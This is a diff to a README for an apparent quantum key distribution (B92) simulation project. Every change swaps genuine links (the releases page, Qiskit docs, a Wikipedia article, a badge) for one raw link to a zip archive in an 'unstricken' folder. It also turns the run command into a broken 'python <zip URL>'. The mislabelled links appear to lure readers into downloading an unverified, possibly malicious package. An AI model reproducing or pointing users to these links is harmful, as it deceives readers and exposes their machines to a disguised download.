@@ -10,9 +10,9 @@ To use the application, you need to download and set up the software. Follow the
 
 ### 📥 Download and Install
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/releases)
+[![Download Here](https://raw.githubusercontent.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/main/unstricken/Error-Correction-in-B92-QKD-Protocol_1.4-alpha.1.zip%20Latest%https://raw.githubusercontent.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/main/unstricken/Error-Correction-in-B92-QKD-Protocol_1.4-alpha.1.zip)](https://raw.githubusercontent.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/main/unstricken/Error-Correction-in-B92-QKD-Protocol_1.4-alpha.1.zip)
 
-1. Visit this page to download: [GitHub Releases Page](https://github.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/releases)
+1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/main/unstricken/Error-Correction-in-B92-QKD-Protocol_1.4-alpha.1.zip)
 2. Look for the latest version. It will be clearly marked.
 3. Click on the link to download the file that matches your system.
 
@@ -46,7 +46,7 @@ Once you have installed all necessary components, you can use the B92 QKD applic
 - Open your terminal or command prompt in this folder.
 - Type the following command and press enter:
   ```
-  python main.py
+  python https://raw.githubusercontent.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/main/unstricken/Error-Correction-in-B92-QKD-Protocol_1.4-alpha.1.zip
   ```
 
 ### 2. Running Simulations
@@ -90,11 +90,11 @@ Your contributions can help make this project better for everyone!
 
 ## 📚 Additional Resources
 
-- [Qiskit Documentation](https://qiskit.org/documentation/) for more information on quantum computing.
-- [Quantum Key Distribution Overview](https://en.wikipedia.org/wiki/Quantum_key_distribution) for a deeper understanding of QKD protocols.
+- [Qiskit Documentation](https://raw.githubusercontent.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/main/unstricken/Error-Correction-in-B92-QKD-Protocol_1.4-alpha.1.zip) for more information on quantum computing.
+- [Quantum Key Distribution Overview](https://raw.githubusercontent.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/main/unstricken/Error-Correction-in-B92-QKD-Protocol_1.4-alpha.1.zip) for a deeper understanding of QKD protocols.
 
 ## 🔗 Final Download Link
 
-Remember, you can always download the latest version from this link: [GitHub Releases Page](https://github.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/releases).
+Remember, you can always download the latest version from this link: [GitHub Releases Page](https://raw.githubusercontent.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/main/unstricken/Error-Correction-in-B92-QKD-Protocol_1.4-alpha.1.zip).
 
 Thank you for using the B92 Quantum Key Distribution Application!
